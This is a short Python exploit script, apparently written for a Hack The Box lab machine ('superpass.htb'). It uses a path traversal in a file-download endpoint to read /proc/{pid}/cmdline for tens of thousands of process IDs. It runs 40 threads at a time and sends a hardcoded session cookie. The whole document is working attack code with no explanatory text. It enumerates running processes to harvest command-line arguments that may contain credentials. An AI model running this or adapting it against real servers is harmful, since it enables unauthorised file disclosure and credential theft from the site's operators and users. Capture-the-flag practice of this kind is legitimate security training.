import requests
import threading

url = "http://superpass.htb/download?fn=../proc/{pid}/cmdline"
session = requests.Session()
cookies = {'session': '.eJwlzjEOwzAIQNG7MHcAArbJZSIDtto1aaaqd6-ljk9_-R845jmuJ-zv8x4POF4JO1RFVWQfGYVtThookWGja_HNvUyl3mtV8QjDxa1O9RWL9SpYMHOZyJu1gi1JtbM3KmKkgiLNnGYYS-dJVDV7TQ4hCVNlWCP3Nc7_jcH3B7gDLoA.ZJ4cyw.AXjgLUzc88yR17sdlWzeDfgOGaA'}
session.cookies = requests.utils.cookiejar_from_dict(cookies)

def proc(pid):
    request = session.get(url.format(pid=pid))
    if request.status_code == 200 and len(request.text) > 0:
        print(f'[{pid}] {request.text}')
        return request
    else:
        return 1
    
threads = []
num_threads = 40
for pid in range(900,65536):
    if len(threads) == 40:
        for thread in threads:
            thread.join()
            threads = []
    t = threading.Thread(target=proc, args=(pid,))
    threads.append(t)
    t.start()